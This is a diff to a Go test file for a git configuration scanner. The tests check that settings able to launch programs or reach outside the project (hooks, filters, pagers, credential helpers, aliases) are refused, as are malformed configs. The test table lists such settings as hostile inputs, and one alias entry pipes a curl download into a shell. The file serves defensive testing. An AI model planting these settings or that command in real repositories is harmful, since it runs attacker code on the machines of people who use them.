@@ -58,65 +58,66 @@ func TestOrdinaryRepositoryConfigurationsAreAccepted(t *testing.T) {
 
 func TestEverySettingThatCanStartAProgramOrReachOutsideTheProjectIsRefused(t *testing.T) {
 	for name, tc := range map[string]struct{ config, setting string }{
-		"a filesystem monitor":   {"[core]\n\tfsmonitor = evil\n", "core.fsmonitor"},
-		"a hooks path":           {"[core]\n\thooksPath = /tmp/evil\n", "core.hookspath"},
-		"a pager":                {"[core]\n\tpager = evil\n", "core.pager"},
-		"an editor":              {"[core]\n\teditor = evil\n", "core.editor"},
-		"an ssh command":         {"[core]\n\tsshCommand = evil\n", "core.sshcommand"},
-		"an askpass":             {"[core]\n\taskPass = evil\n", "core.askpass"},
-		"a git proxy":            {"[core]\n\tgitProxy = evil\n", "core.gitproxy"},
-		"a work tree":            {"[core]\n\tworktree = /\n", "core.worktree"},
-		"an attributes file":     {"[core]\n\tattributesFile = /tmp/a\n", "core.attributesfile"},
-		"alternate refs command": {"[core]\n\talternateRefsCommand = evil\n", "core.alternaterefscommand"},
-		"a bare repository":      {"[core]\n\tbare = true\n", "core.bare"},
-		"a bare flag in no form": {"[core]\n\tbare\n", "core.bare"},
-		"a future format":        {"[core]\n\trepositoryformatversion = 7\n", "core.repositoryformatversion"},
-		"a clean filter":         {"[filter \"x\"]\n\tclean = evil\n", "filter.<name>.clean"},
-		"a smudge filter":        {"[filter \"x\"]\n\tsmudge = evil\n", "filter.<name>.smudge"},
-		"a process filter":       {"[filter \"x\"]\n\tprocess = evil\n", "filter.<name>.process"},
-		"a required filter":      {"[filter \"x\"]\n\trequired = true\n", "filter.<name>.required"},
-		"a text conversion":      {"[diff \"x\"]\n\ttextconv = evil\n", "diff.<name>.textconv"},
-		"a diff command":         {"[diff \"x\"]\n\tcommand = evil\n", "diff.<name>.command"},
-		"an external diff":       {"[diff]\n\texternal = evil\n", "diff.external"},
-		"a diff tool":            {"[diff]\n\ttool = evil\n", "diff.tool"},
-		"a difftool":             {"[difftool \"x\"]\n\tcmd = evil\n", "difftool.<name>.cmd"},
-		"a merge driver":         {"[merge \"x\"]\n\tdriver = evil\n", "merge.<name>.driver"},
-		"a merge tool":           {"[merge]\n\ttool = evil\n", "merge.tool"},
-		"a mergetool":            {"[mergetool \"x\"]\n\tcmd = evil\n", "mergetool.<name>.cmd"},
-		"a credential helper":    {"[credential]\n\thelper = evil\n", "credential.helper"},
-		"a named credential":     {"[credential \"https://x\"]\n\thelper = evil\n", "credential.<name>.helper"},
-		"a gpg program":          {"[gpg]\n\tprogram = evil\n", "gpg.program"},
-		"a gpg ssh program":      {"[gpg \"ssh\"]\n\tprogram = evil\n", "gpg.<name>.program"},
-		"an alias":               {"[alias]\n\tst = !evil\n", "alias.st"},
-		"a shell alias":          {"[alias]\n\tstatus = !curl evil|sh\n", "alias.status"},
-		"a per-command pager":    {"[pager]\n\tstatus = evil\n", "pager.status"},
-		"a trailer command":      {"[trailer \"x\"]\n\tcmd = evil\n", "trailer.<name>.cmd"},
-		"a remote helper":        {"[remote \"o\"]\n\tvcs = evil\n", "remote.<name>.vcs"},
-		"an upload pack":         {"[remote \"o\"]\n\tuploadpack = evil\n", "remote.<name>.uploadpack"},
-		"a receive pack":         {"[remote \"o\"]\n\treceivepack = evil\n", "remote.<name>.receivepack"},
-		"a remote proxy":         {"[remote \"o\"]\n\tproxy = evil\n", "remote.<name>.proxy"},
-		"a promisor remote":      {"[remote \"o\"]\n\tpromisor = true\n", "remote.<name>.promisor"},
-		"a submodule update":     {"[submodule \"s\"]\n\tupdate = !evil\n", "submodule.<name>.update"},
-		"a nameless remote":      {"[remote]\n\turl = x\n", "remote.url"},
-		"an include":             {"[include]\n\tpath = /tmp/evil\n", "include.path"},
-		"a conditional include":  {"[includeIf \"gitdir:/\"]\n\tpath = /tmp/evil\n", "includeif.<name>.path"},
-		"a worktree config":      {"[extensions]\n\tworktreeConfig = true\n", "extensions.worktreeconfig"},
-		"a partial clone":        {"[extensions]\n\tpartialClone = o\n", "extensions.partialclone"},
-		"a maintenance command":  {"[maintenance]\n\tauto = true\n", "maintenance.auto"},
-		"a sequence editor":      {"[sequence]\n\teditor = evil\n", "sequence.editor"},
-		"a web browser":          {"[web]\n\tbrowser = evil\n", "web.browser"},
-		"a mail program":         {"[sendemail]\n\tsmtpServerOption = x\n", "sendemail.smtpserveroption"},
-		"a safe directory":       {"[safe]\n\tdirectory = *\n", "safe.directory"},
-		"a pretty format":        {"[pretty]\n\tx = %h\n", "pretty.x"},
-		"an unknown section":     {"[nonesuch]\n\tkey = value\n", "nonesuch.key"},
-		"an unknown core key":    {"[core]\n\tfuturekey = x\n", "core.futurekey"},
-		"a named diff option":    {"[diff \"x\"]\n\talgorithm = patience\n", "diff.<name>.algorithm"},
-		"signature display":      {"[log]\n\tshowSignature = true\n", "log.showsignature"},
-		"a template dir":         {"[init]\n\ttemplateDir = /tmp/t\n", "init.templatedir"},
-		"a rebase exec":          {"[rebase]\n\tautoSquash = true\n\texec = evil\n", "rebase.exec"},
-		"a named tag section":    {"[tag \"x\"]\n\tsort = x\n", "tag.<name>.sort"},
-		"a named commit section": {"[commit \"x\"]\n\tgpgsign = true\n", "commit.<name>.gpgsign"},
-		"a named core section":   {"[core \"x\"]\n\tbare = false\n", "core.<name>.bare"},
+		"an unnamed filter section": {"[filter]\n\tclean = x\n", "filter.clean"},
+		"a filesystem monitor":      {"[core]\n\tfsmonitor = evil\n", "core.fsmonitor"},
+		"a hooks path":              {"[core]\n\thooksPath = /tmp/evil\n", "core.hookspath"},
+		"a pager":                   {"[core]\n\tpager = evil\n", "core.pager"},
+		"an editor":                 {"[core]\n\teditor = evil\n", "core.editor"},
+		"an ssh command":            {"[core]\n\tsshCommand = evil\n", "core.sshcommand"},
+		"an askpass":                {"[core]\n\taskPass = evil\n", "core.askpass"},
+		"a git proxy":               {"[core]\n\tgitProxy = evil\n", "core.gitproxy"},
+		"a work tree":               {"[core]\n\tworktree = /\n", "core.worktree"},
+		"an attributes file":        {"[core]\n\tattributesFile = /tmp/a\n", "core.attributesfile"},
+		"alternate refs command":    {"[core]\n\talternateRefsCommand = evil\n", "core.alternaterefscommand"},
+		"a bare repository":         {"[core]\n\tbare = true\n", "core.bare"},
+		"a bare flag in no form":    {"[core]\n\tbare\n", "core.bare"},
+		"a future format":           {"[core]\n\trepositoryformatversion = 7\n", "core.repositoryformatversion"},
+		"a clean filter":            {"[filter \"x\"]\n\tclean = evil\n", "filter.<name>.clean"},
+		"a smudge filter":           {"[filter \"x\"]\n\tsmudge = evil\n", "filter.<name>.smudge"},
+		"a process filter":          {"[filter \"x\"]\n\tprocess = evil\n", "filter.<name>.process"},
+		"a required filter":         {"[filter \"x\"]\n\trequired = true\n", "filter.<name>.required"},
+		"a text conversion":         {"[diff \"x\"]\n\ttextconv = evil\n", "diff.<name>.textconv"},
+		"a diff command":            {"[diff \"x\"]\n\tcommand = evil\n", "diff.<name>.command"},
+		"an external diff":          {"[diff]\n\texternal = evil\n", "diff.external"},
+		"a diff tool":               {"[diff]\n\ttool = evil\n", "diff.tool"},
+		"a difftool":                {"[difftool \"x\"]\n\tcmd = evil\n", "difftool.<name>.cmd"},
+		"a merge driver":            {"[merge \"x\"]\n\tdriver = evil\n", "merge.<name>.driver"},
+		"a merge tool":              {"[merge]\n\ttool = evil\n", "merge.tool"},
+		"a mergetool":               {"[mergetool \"x\"]\n\tcmd = evil\n", "mergetool.<name>.cmd"},
+		"a credential helper":       {"[credential]\n\thelper = evil\n", "credential.helper"},
+		"a named credential":        {"[credential \"https://x\"]\n\thelper = evil\n", "credential.<name>.helper"},
+		"a gpg program":             {"[gpg]\n\tprogram = evil\n", "gpg.program"},
+		"a gpg ssh program":         {"[gpg \"ssh\"]\n\tprogram = evil\n", "gpg.<name>.program"},
+		"an alias":                  {"[alias]\n\tst = !evil\n", "alias.st"},
+		"a shell alias":             {"[alias]\n\tstatus = !curl evil|sh\n", "alias.status"},
+		"a per-command pager":       {"[pager]\n\tstatus = evil\n", "pager.status"},
+		"a trailer command":         {"[trailer \"x\"]\n\tcmd = evil\n", "trailer.<name>.cmd"},
+		"a remote helper":           {"[remote \"o\"]\n\tvcs = evil\n", "remote.<name>.vcs"},
+		"an upload pack":            {"[remote \"o\"]\n\tuploadpack = evil\n", "remote.<name>.uploadpack"},
+		"a receive pack":            {"[remote \"o\"]\n\treceivepack = evil\n", "remote.<name>.receivepack"},
+		"a remote proxy":            {"[remote \"o\"]\n\tproxy = evil\n", "remote.<name>.proxy"},
+		"a promisor remote":         {"[remote \"o\"]\n\tpromisor = true\n", "remote.<name>.promisor"},
+		"a submodule update":        {"[submodule \"s\"]\n\tupdate = !evil\n", "submodule.<name>.update"},
+		"a nameless remote":         {"[remote]\n\turl = x\n", "remote.url"},
+		"an include":                {"[include]\n\tpath = /tmp/evil\n", "include.path"},
+		"a conditional include":     {"[includeIf \"gitdir:/\"]\n\tpath = /tmp/evil\n", "includeif.<name>.path"},
+		"a worktree config":         {"[extensions]\n\tworktreeConfig = true\n", "extensions.worktreeconfig"},
+		"a partial clone":           {"[extensions]\n\tpartialClone = o\n", "extensions.partialclone"},
+		"a maintenance command":     {"[maintenance]\n\tauto = true\n", "maintenance.auto"},
+		"a sequence editor":         {"[sequence]\n\teditor = evil\n", "sequence.editor"},
+		"a web browser":             {"[web]\n\tbrowser = evil\n", "web.browser"},
+		"a mail program":            {"[sendemail]\n\tsmtpServerOption = x\n", "sendemail.smtpserveroption"},
+		"a safe directory":          {"[safe]\n\tdirectory = *\n", "safe.directory"},
+		"a pretty format":           {"[pretty]\n\tx = %h\n", "pretty.x"},
+		"an unknown section":        {"[nonesuch]\n\tkey = value\n", "nonesuch.key"},
+		"an unknown core key":       {"[core]\n\tfuturekey = x\n", "core.futurekey"},
+		"a named diff option":       {"[diff \"x\"]\n\talgorithm = patience\n", "diff.<name>.algorithm"},
+		"signature display":         {"[log]\n\tshowSignature = true\n", "log.showsignature"},
+		"a template dir":            {"[init]\n\ttemplateDir = /tmp/t\n", "init.templatedir"},
+		"a rebase exec":             {"[rebase]\n\tautoSquash = true\n\texec = evil\n", "rebase.exec"},
+		"a named tag section":       {"[tag \"x\"]\n\tsort = x\n", "tag.<name>.sort"},
+		"a named commit section":    {"[commit \"x\"]\n\tgpgsign = true\n", "commit.<name>.gpgsign"},
+		"a named core section":      {"[core \"x\"]\n\tbare = false\n", "core.<name>.bare"},
 		"a core section hidden after a harmless one": {"[user]\n\tname = x\n[core]\n\tfsmonitor = evil\n", "core.fsmonitor"},
 	} {
 		_ = name
@@ -166,11 +167,15 @@ func TestAConfigurationThatCannotBeReadWithCertaintyIsRefused(t *testing.T) {
 		"a double subsection":            "[remote \"a\" \"b\"]\n\turl = x\n",
 		"a subsection on an older form":  "[remote.a \"b\"]\n\turl = x\n",
 	} {
-		_ = name
-		if _, err := ScanConfig([]byte(config)); err == nil {
+		_, err := ScanConfig([]byte(config))
+		r, ok := IsRefusal(err)
+		switch {
+		case err == nil:
 			t.Errorf("%s was accepted", name)
-		} else if _, ok := IsRefusal(err); !ok {
+		case !ok:
 			t.Errorf("%s: not a refusal: %v", name, err)
+		case r.Reason == "config_risky":
+			t.Errorf("%s: refused as risky, not as unreadable: %v", name, err)
 		}
 	}
 }
@@ -208,7 +213,7 @@ func TestANULInsideAnAcceptableSettingIsStillRefused(t *testing.T) {
 }
 
 func TestMalformedHeadersAreRefusedEvenWhenTheRestLooksHarmless(t *testing.T) {
-	for _, config := range []string{"[core x]\n\tbare = false\n", "[core \"a\" x]\n\tbare = false\n", "[user\"]\n\tname = x\n", "[user name]\n\tname = x\n"} {
+	for _, config := range []string{"[core x]\n\tbare = false\n", "[core \"a\" x]\n\tbare = false\n", "[user\"]\n\tname = x\n", "[user name]\n\tname = x\n", "[user xname = x]\n"} {
 		if _, err := ScanConfig([]byte(config)); err == nil {
 			t.Errorf("a malformed header was accepted:\n%s", config)
 		}
